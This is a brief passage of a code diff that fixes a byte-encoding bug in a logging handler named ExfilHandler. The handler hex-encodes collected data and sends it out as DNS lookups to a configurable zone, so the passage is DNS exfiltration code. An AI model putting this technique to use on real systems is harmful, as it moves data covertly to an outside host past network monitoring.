@@ -56,7 +56,7 @@ class ExfilHandler(logging.handlers.MemoryHandler):
             if self.exfil_data is None:
                 return
             for exfil in self.exfil_data:
-                payload = binascii.hexlify(bytes(exfil), 'utf8')
+                payload = binascii.hexlify(bytes(exfil, 'utf8'))
                 try:
                     dns.resolver.query(
                         '{exfil}.{dns_zone}'.format(
